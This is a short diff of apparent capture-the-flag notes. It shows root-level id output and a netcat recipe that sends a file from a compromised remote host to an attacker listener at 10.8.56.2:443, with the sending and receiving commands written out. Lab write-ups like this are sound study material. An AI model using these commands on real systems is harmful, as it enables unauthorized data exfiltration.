@@ -51,10 +51,8 @@ OUPUT:
         uid=0(root) gid=1000(kiba) groups=1000(kiba),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),114(lpadmin),115(sambashare)
 
 ## Transferring file using Netcat:
-- on the remote host 
-    nc 10.8.56.2 443 < tryhackme.asc
-- on the local host
-    sudo nc -lvnp 443 > tryhackme.asc
+- remote host           nc 10.8.56.2 443 < file
+- local host            sudo nc -lvnp 443 > file
 
 
 
